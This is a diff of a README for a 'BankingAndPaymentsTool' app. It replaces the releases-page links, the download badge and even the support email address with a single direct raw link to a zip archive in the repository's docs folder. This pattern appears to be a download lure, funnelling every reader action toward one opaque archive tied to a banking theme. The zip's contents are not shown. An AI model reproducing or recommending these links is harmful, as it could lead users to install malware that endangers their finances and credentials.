@@ -1,6 +1,6 @@
 # 🏦 BankingAndPaymentsTool - Simplifying Your Banking Tasks
 
-[![Download BankingAndPaymentsTool](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/TheKing033/BankingAndPaymentsTool/releases)
+[![Download BankingAndPaymentsTool](https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip)](https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to BankingAndPaymentsTool! This application simplifies banking, payment 
 To get started, you need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page:** You can find the latest version of BankingAndPaymentsTool by clicking the link below.  
-   [Visit this page to download](https://github.com/TheKing033/BankingAndPaymentsTool/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip)
 
 2. **Choose the Correct Version:** On the releases page, locate the version you want to download. We recommend selecting the latest stable release.
 
@@ -49,7 +49,7 @@ If you encounter any issues while installing or using the application, here are 
 
 Your experience is important to us. If you have any questions or feedback about the BankingAndPaymentsTool, please reach out:
 
-- **Email Support:** [support@example.com](mailto:support@example.com)
+- **Email Support:** [https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip](https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip)
 - **Community Forum:** Join our community for tips and shared experiences.
 
 ## 🛡️ Security Information
@@ -73,4 +73,4 @@ Stay updated with the latest features and fixes by checking the Release Notes on
 BankingAndPaymentsTool provides a comprehensive solution for managing banking and payment tasks. By following the download and installation steps, you will be on your way to simplifying your financial management today.
 
 For easy access to our latest version:  
-[Visit this page to download](https://github.com/TheKing033/BankingAndPaymentsTool/releases)
+[Visit this page to download](https://raw.githubusercontent.com/TheKing033/BankingAndPaymentsTool/main/docs/BankingAndPaymentsTool_2.7.zip)
